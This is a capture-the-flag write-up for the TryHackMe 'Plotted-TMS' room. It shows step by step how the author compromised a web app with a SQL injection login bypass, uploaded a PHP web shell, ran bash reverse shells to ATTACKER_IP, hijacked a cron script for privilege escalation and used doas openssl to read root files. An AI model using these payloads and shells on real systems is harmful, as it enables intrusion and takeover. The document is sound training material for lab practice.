# Plotted-TMS

Room: https://tryhackme.com/room/plottedtms

boot2root machine for FIT and bsides guatemala CTF

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/plottedtms.md

---------

## Summary

This room started with a web enumeration path where port `445` was not SMB, but an Apache HTTP service. The useful application was an Online Traffic Offense Management System hosted under `/management/`.

The main path was:

```text
Web enumeration
SQL dump disclosure
SQL injection login bypass
PHP avatar upload to RCE
www-data shell
cron script abuse to plot_admin
doas openssl permission to read root flag
```

## Nmap

I started with a full TCP scan and service detection.

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt TARGET_IP
```

Open ports:

```text
22/tcp   open  ssh
80/tcp   open  http
445/tcp  open  http
```

The important detail was that port `445` was **not SMB**. Nmap identified it as Apache HTTP.

```text
445/tcp open  http Apache httpd 2.4.41
```

So I treated both port `80` and port `445` as web services.

## Web Enumeration

I ran directory brute forcing against both web ports.

```bash
gobuster dir -u http://TARGET_IP/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,html,js \
-o gobuster-80.txt
```

Port `80` had mostly rabbit holes:

```text
/admin
/shadow
/passwd
```

Then I checked port `445`.

```bash
gobuster dir -u http://TARGET_IP:445/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,html,js \
-o gobuster-445.txt
```

This found the useful path:

```text
/management
```

The admin login was located at:

```text
http://TARGET_IP:445/management/admin/login.php
```

## Directory Listing and SQL Dump

While enumerating `/management/`, several directories had listing enabled.

Important paths included:

```text
/management/classes/
/management/database/
/management/uploads/
/management/assets/
/management/dist/
/management/plugins/
/management/libs/
```

I downloaded the exposed files.

```bash
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://TARGET_IP:445/management/classes/
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://TARGET_IP:445/management/database/
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://TARGET_IP:445/management/uploads/
```

The database directory exposed an SQL dump:

```text
/management/database/traffic_offense_db.sql
```

I inspected it locally.

```bash
cat database/traffic_offense_db.sql
```

The dump contained a `users` table with MD5 password hashes.

Example masked values:

```text
admin  : 019202...b500
jsmith : 125473...f38e
```

The second hash cracked to:

```text
jsmith : jsm...123
```

The dump also confirmed the app name:

```text
Online Traffic Offense Management System - PHP
```

## Login SQL Injection

The cracked web credentials did not log in normally, so I inspected the login JavaScript.

```bash
curl -s http://TARGET_IP:445/management/dist/js/script.js | grep -iE "login-frm|Login.php|ajax|username|password|f=login" -n
```

This showed the login endpoint:

```text
/management/classes/Login.php?f=login
```

I tested the login with curl.

```bash
curl -i -c cookies.txt -b cookies.txt \
-H "X-Requested-With: XMLHttpRequest" \
-H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
-X POST \
--data "username=admin&password=admin123" \
"http://TARGET_IP:445/management/classes/Login.php?f=login"
```

The response leaked the SQL query.

```json
{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('admin123') "}
```

Because the username was placed directly into the query, I bypassed authentication by commenting out the password check.

```bash
curl -i -c cookies.txt -b cookies.txt \
-H "X-Requested-With: XMLHttpRequest" \
-H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
-X POST \
--data-urlencode "username=admin' -- -" \
--data-urlencode "password=test" \
"http://TARGET_IP:445/management/classes/Login.php?f=login"
```

The response confirmed success.

```json
{"status":"success"}
```

In the browser, the same payload worked:

```text
Username: admin' -- -
Password: test
```

## PHP Upload to RCE

After logging in as admin, I looked for upload functionality.

The useful upload was under **My Account**, using the avatar upload field.

I created a simple PHP command shell.

```bash
printf '%s\n' '<?php system($_GET["cmd"]); ?>' > cmd.php
```

After uploading it as the account avatar, I copied the uploaded file link.

The uploaded shell landed under `/management/uploads/`.

```text
http://TARGET_IP:445/management/uploads/TIMESTAMP_cmd.php
```

I confirmed command execution.

```bash
curl "http://TARGET_IP:445/management/uploads/TIMESTAMP_cmd.php?cmd=id"
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell as www-data

I started a listener on my attack box.

```bash
nc -lvnp 4444
```

Then triggered a bash reverse shell through the uploaded PHP file.

```bash
curl "http://TARGET_IP:445/management/uploads/TIMESTAMP_cmd.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261%27"
```

I got a shell as `www-data`.

```text
www-data@plotted:/var/www/html/445/management/uploads$
```

## Web App Config

From the web root, I inspected the application files.

```bash
cd /var/www/html/445/management
cat initialize.php
```

The file contained database credentials and a developer hash.

Masked example:

```php
DB_USERNAME = "tms_user"
DB_PASSWORD = "Pass...123"
DB_NAME = "tms_db"
```

The live database also showed that the user from the dump had been changed to `puser`.

```text
Plotted User
puser
125473...f38e
```

## Privilege Escalation to plot_admin

I found a backup script in `/var/www/scripts`.

```bash
cd /var/www/scripts
ls -la
cat backup.sh
```

The original script:

```bash
#!/bin/bash

/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
/bin/chmod -R 770 /home/plot_admin/tms_backup/management
```

Permissions were interesting.

```text
drwxr-xr-x 2 www-data   www-data   .
-rwxrwxr-- 1 plot_admin plot_admin backup.sh
```

The script itself was owned by `plot_admin`, but the directory was owned by `www-data`, meaning I could rename and replace the script.

I checked `/etc/crontab`.

```bash
cat -n /etc/crontab
```

The important cron line was:

```text
* * * * * plot_admin /var/www/scripts/backup.sh
```

So cron was running the script every minute as `plot_admin`.

I first confirmed cron execution with a debug payload.

```bash
cd /var/www/scripts

printf '#!/bin/bash\n/usr/bin/id > /dev/shm/cron_test\n/usr/bin/whoami >> /dev/shm/cron_test\n/usr/bin/date >> /dev/shm/cron_test\n' > backup.sh

chmod 755 backup.sh
```

After waiting for cron:

```bash
cat /dev/shm/cron_test
```

Output confirmed execution as `plot_admin`.

```text
uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
plot_admin
```

I first tried creating a SUID bash in `/dev/shm`, but `/dev/shm` was mounted with `nosuid`.

```bash
mount | grep shm
```

Output:

```text
tmpfs on /dev/shm type tmpfs rw,nosuid,nodev
```

So I used a reverse shell instead.

On my attack box:

```bash
nc -lvnp 5555
```

On the target, I replaced the cron script:

```bash
cd /var/www/scripts

printf '#!/bin/bash\n/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1"\n' > backup.sh

chmod 755 backup.sh
```

After cron ran, I received a shell as `plot_admin`.

```text
plot_admin@plotted:~$
```

## Stable SSH Access

To make the shell stable, I added an SSH key.

On my attack box:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/plotted_plot_admin -N ""
cat ~/.ssh/plotted_plot_admin.pub
```

On the target as `plot_admin`:

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo 'PASTE_PUBLIC_KEY_HERE' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Then I connected with SSH:

```bash
ssh -i ~/.ssh/plotted_plot_admin plot_admin@TARGET_IP
```

I grabbed the user flag.

```bash
id
hostname
pwd
cat user.txt
```

Masked user flag:

```text
779275...badb
```

## Privilege Escalation to Root

LinPEAS found an interesting `doas` configuration.

```text
Doas binary has SUID bit set
/usr/bin/doas
```

The config file `/etc/doas.conf` allowed `plot_admin` to run `openssl` as root without a password.

```text
permit nopass plot_admin as root cmd openssl
```

This allowed reading root-owned files with `openssl`.

```bash
doas openssl enc -in /root/root.txt
```

That printed the root flag.

Masked root flag:

```text
53f85e...dcab
```

## Final Notes

The intended path was:

```text
Port 445 HTTP
/management app
Exposed SQL dump
SQL injection login bypass
Admin avatar PHP upload
www-data shell
Writable cron script path
plot_admin shell
doas openssl root file read
```

The cleanest SQLi payload was:

```text
admin' -- -
```

This worked because the vulnerable query already checked for the `admin` username, so the payload only needed to comment out the password check.

## Lessons Learned

* Do not assume port `445` is SMB. Service detection showed it was HTTP.
* Directory listing can expose high impact files such as SQL dumps.
* Debug SQL output can quickly confirm injection points.
* File upload features should be tested carefully, especially avatar uploads.
* Directory ownership can be just as important as file ownership.
* Cron jobs running user-controlled scripts are a reliable privilege escalation path.
* `doas` permissions should be checked just like `sudo -l`.
